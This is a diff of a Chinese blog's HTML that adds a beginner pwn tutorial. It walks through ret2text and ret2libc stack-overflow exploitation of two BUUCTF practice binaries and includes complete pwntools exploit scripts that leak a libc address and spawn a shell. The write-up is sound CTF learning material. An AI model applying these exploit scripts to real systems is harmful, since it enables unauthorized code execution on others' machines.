@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="pwn,">
 
 
 
@@ -79,17 +79,24 @@
 
 
 
-<meta name="description" content="Waiting for a light that never comes">
-<meta property="og:type" content="website">
-<meta property="og:title" content="关于">
-<meta property="og:url" content="http://wlupus.github.io/about/index.html">
+<meta name="description" content="pwn的基础方法">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn入门">
+<meta property="og:url" content="http://wlupus.github.io/2020/02/03/pwn_baby/index.html">
 <meta property="og:site_name" content="wlupus">
-<meta property="og:description" content="Waiting for a light that never comes">
+<meta property="og:description" content="pwn的基础方法">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-13T14:02:02.792Z">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/03/pwn_baby/gdb.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/03/pwn_baby/rip3.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/03/pwn_baby/rip1.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/03/pwn_baby/rip2.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/03/pwn_baby/rip4.png">
+<meta property="og:updated_time" content="2020-02-03T10:33:30.254Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="关于">
-<meta name="twitter:description" content="Waiting for a light that never comes">
+<meta name="twitter:title" content="pwn入门">
+<meta name="twitter:description" content="pwn的基础方法">
+<meta name="twitter:image" content="http://wlupus.github.io/2020/02/03/pwn_baby/gdb.png">
 
 
 
@@ -119,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://wlupus.github.io/about/">
+  <link rel="canonical" href="http://wlupus.github.io/2020/02/03/pwn_baby/">
 
 
 
 
 
-  <title>关于 | wlupus</title>
+  <title>pwn入门 | wlupus</title>
   
 
 
@@ -292,33 +299,213 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wlupus.github.io/2020/02/03/pwn_baby/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wlupus">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wlupus">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">关于</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
+          <h1 class="post-title" itemprop="name headline">pwn入门</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T11:23:42+08:00">
+                2020-02-03
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-02-03T18:33:30+08:00">
+                2020-02-03
+              </time>
+            
+          </span>
+
           
-        
-      </div>
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/学习记录/" itemprop="url" rel="index">
+                    <span itemprop="name">学习记录</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <p>pwn的基础方法</p>
+<a id="more"></a>
+<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>师傅在入门课上提出了一个问题</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a=<span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个程序在linux  64位环境下每次运行的结果都不相同，出乎我的意料。我最初的想法是将a的二进制位当做一个int来读取，只取前32位。但是这样结果应该是一个确定的值，而非每次都不相同。我们可以用gdb一探究竟。</p>
+<img src="/2020/02/03/pwn_baby/gdb.png">
+<p>步进到调用printf处，我们可以看到guessed arguments处只有一个arg[0]，即printf只有格式化字符串这个参数，变量a并没有被当做参数传入。因此，a中的值也没有被放到rsi寄存器里。最终，我们输出的是rsi中的值，这个值因受之前运算的影响而每次不同。</p>
+<h1 id="pwn基础方法"><a href="#pwn基础方法" class="headerlink" title="pwn基础方法"></a>pwn基础方法</h1><p>推荐知乎上的一篇文章 <a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃</a>。其中具体讲解了栈溢出的原理和方法基础。我就结合几道简单题演示一下这些方法应该如何使用</p>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>shellcode没找到合适的例子，暂且略过<del>（这年头是程序基本都开nx保护）</del></p>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>找到关键函数的位置，通过栈溢出将return address覆盖为关键函数的地址，从而获取flag 。</p>
+<p>以buuctf上的<a href="https://buuoj.cn/challenges#rip" target="_blank" rel="noopener">rip</a>为例,首先查看文件类型和保护。</p>
+<img src="/2020/02/03/pwn_baby/rip3.png">
+<p>确定是64位程序，没有开启各种保护。</p>
+<p>之后ida查看一下大致运行的流程。</p>
+<img src="/2020/02/03/pwn_baby/rip1.png">
+<p>很明显，gets这个函数可以溢出。观察到有fun这个函数</p>
+<img src="/2020/02/03/pwn_baby/rip2.png">
+<p>所以思路很明显，我们通过gets将return address 覆盖为fun函数的地址，实现获取flag</p>
+<p>先用gdb计算偏移得出偏移为23，然后查看ida找到call system及传入参数的指令的地址</p>
+<img src="/2020/02/03/pwn_baby/rip4.png">
+<p>之后构造如下payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn1'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">23</span> + p64(<span class="number">0x40118A</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>就可以通过cat flag得到flag</p>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>如果程序中没有给出system函数和’/bin/sh’字符串的话，前面的操作就无法实现。不过我们可以对libc中的system函数加以利用，实现和上面相似的效果</p>
+<p>以buuctf上的<a href="https://buuoj.cn/challenges#ciscn_2019_c_1" target="_blank" rel="noopener">ciscn_2019_c_1</a>为例</p>
+<p>首先查看类型和保护，发现开启了nx保护。</p>
+<p>之后用ida反汇编，发现其中的encrypt函数存在溢出点。</p>
+
+<p>我们首先要计算出libc的偏移，这可以通过puts函数来实现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">num = <span class="number">0x58</span></span><br><span class="line">puts_got_address = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt_address = <span class="number">0x4006e0</span></span><br><span class="line">pop_rdi_address = <span class="number">0x400c83</span></span><br><span class="line">start_main_address = elf.sym[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * num + p64(pop_rdi_address) + p64(puts_got_address) + p64(puts_plt_address) + p64(start_main_address)</span><br></pre></td></tr></table></figure>
+<p>这个payload和之前的相比更加复杂。首先将pop_rdi;ret ;这条指令的地址覆写到return address，这样程序就会将rdi中的数据变成后面的puts_got_address,同时将rip变为puts在plt段中的地址。这样就可以实现puts输出puts这个函数在got表中的地址。最后的start_main_address是为了保证栈空间结构的正确性，即从头开始运行程序。</p>
+<p>我们接收输出的地址，并利用这个地址和libc库比对，得到对应libc，从而计算出函数地址的偏移。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">libc_puts_address = u64(sh.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, libc_puts_address)</span><br><span class="line"><span class="comment"># 查找对应的libc</span></span><br><span class="line">libc_base = libc_puts_address - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"><span class="comment"># 计算函数地址的偏移</span></span><br><span class="line">system_address = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"><span class="comment"># 计算system函数的实际地址</span></span><br><span class="line">binsh_address = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="comment"># 计算/bin/sh这个字符串的实际地址</span></span><br><span class="line">payload = <span class="string">'A'</span> * num </span><br><span class="line">payload += p64(<span class="number">0x4006b9</span>)</span><br><span class="line"><span class="comment"># 添加一个ret指令保证字节对齐</span></span><br><span class="line">payload += p64(pop_rdi_address) + p64(binsh_address) + p64(system_address)</span><br></pre></td></tr></table></figure>
+<p>新payload的构造与上面的相似，最终实现调用system函数的目的。</p>
+<p>总的exp为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28331</span>)</span><br><span class="line"><span class="comment">#sh = process('./pwn')</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">num = <span class="number">0x58</span></span><br><span class="line">puts_got_address = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt_address = <span class="number">0x4006e0</span></span><br><span class="line">pop_rdi_address = <span class="number">0x400c83</span></span><br><span class="line">start_main_address = elf.sym[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * num + p64(pop_rdi_address) + p64(puts_got_address) + p64(puts_plt_address) + p64(start_main_address)</span><br><span class="line">sh.sendlineafter(<span class="string">'choice!\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'@'</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line"></span><br><span class="line">libc_puts_address = u64(sh.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, libc_puts_address)</span><br><span class="line">libc_base = libc_puts_address - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_address = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_address = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * num </span><br><span class="line">payload += p64(<span class="number">0x4006b9</span>)</span><br><span class="line">payload += p64(pop_rdi_address) + p64(binsh_address) + p64(system_address)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'choice!\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/31/spider/" rel="next" title="spider">
+                <i class="fa fa-chevron-left"></i> spider
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -351,8 +538,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -412,6 +608,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#引言"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn基础方法"><span class="nav-number">2.</span> <span class="nav-text">pwn基础方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">2.1.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2text"><span class="nav-number">2.2.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc"><span class="nav-number">2.3.</span> <span class="nav-text">ret2libc</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
